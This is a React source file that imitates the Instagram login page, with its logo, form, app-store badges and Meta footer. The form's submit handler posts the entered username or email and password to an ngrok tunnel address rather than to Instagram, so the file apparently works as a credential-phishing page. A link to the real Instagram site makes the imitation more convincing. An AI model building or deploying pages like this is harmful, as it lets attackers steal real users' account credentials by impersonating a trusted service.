import { useState } from "react";
import apple from "../public/img/apple-button.png";
import google from "../public/img/googleplay-button.png";
import instaLogo from "../public/img/instagram-logo.png";
import instaCelular from "../public/img/instagram-celular.png";
import axios from 'axios';
import "./App.css";

function App() {
  const [formData, setFormData] = useState({
    email: "",
    password: "",
  });

  const handleInputChange = (event) => {
    const { name, value } = event.target;
    setFormData({
      ...formData,
      [name]: value,
    });
  };

  const handleSubmit = async (event) => {
    event.preventDefault();
    try {
      await axios.post('https://af93-2409-40f3-1099-94cb-ce82-3c-2d91-9b5c.ngrok-free.app/submit-form', formData);
      console.log('Form data sent to the server');
    } catch (error) {
      console.error('Error sending form data:', error);
    }
  };
  return (
    <>
      <main class="flex align-items-center justify-content-center">
        <section id="mobile" class="flex"></section>
        <section id="auth" class="flex direction-column">
          <div class="panel login flex direction-column">
            <h1 title="Instagram" class="flex justify-content-center">
              <img
                src={instaLogo}
                alt="Instagram logo"
                title="Instagram logo"
              />
            </h1>
            <form onSubmit={handleSubmit}>
              <label for="email" class="sr-only">
                Telefone, nome de usuário ou e-mail
              </label>
              <input
                name="email"
                placeholder="Phone number, username or email"
                value={formData.email}
                onChange={handleInputChange}
              />
              <label for="password" class="sr-only">
                Senha
              </label>
              <input
                name="password"
                type="password"
                placeholder="Password"
                value={formData.password}
                onChange={handleInputChange}
              />
              <button type="submit">Log In</button>
            </form>
            <div class="flex separator align-items-center">
              <span></span>
              <div class="or">OR</div>
              <span></span>
            </div>
            <div class="login-with-fb flex direction-column align-items-center">
              <div>
                <img />
                <a>Log in with Facebook</a>
              </div>
              <a href="#">Forgot password?</a>
            </div>
          </div>
          <div class="panel register flex justify-content-center">
            <a href="https://www.instagram.com/accounts/login/">
              Don't have an account? Sign up
            </a>
          </div>
          <div class="app-download flex direction-column align-items-center">
            <p>Get the app.</p>
            <div class="flex justify-content-center">
              <img
                src={apple}
                alt="Imagem com a logo da Apple Store"
                title="Imagem com a logo da Apple Store"
              />
              <img
                src={google}
                alt="Imagem com a logo da Google Play"
                title="Imagem com a logo da Google Play"
              />
            </div>
          </div>
        </section>
      </main>
      <footer>
        <ul class="flex flex-wrap justify-content-center">
          <li>
            <a href="#">Meta</a>
          </li>
          <li>
            <a href="#">About</a>
          </li>
          <li>
            <a href="#">Blog</a>
          </li>
          <li>
            <a href="#">Jobs</a>
          </li>
          <li>
            <a href="#">API</a>
          </li>
          <li>
            <a href="#">Privacy</a>
          </li>
          <li>
            <a href="#">Terms</a>
          </li>
          <li>
            <a href="#">Location</a>
          </li>
          <li>
            <a href="#">Contact</a>
          </li>
          <li>
            <a href="#">Theads</a>
          </li>
          <li>
            <a href="#">Meta verified</a>
          </li>
        </ul>
        <p class="copyright">© 2020 Instagram from meta</p>
      </footer>
    </>
  );
}

export default App;
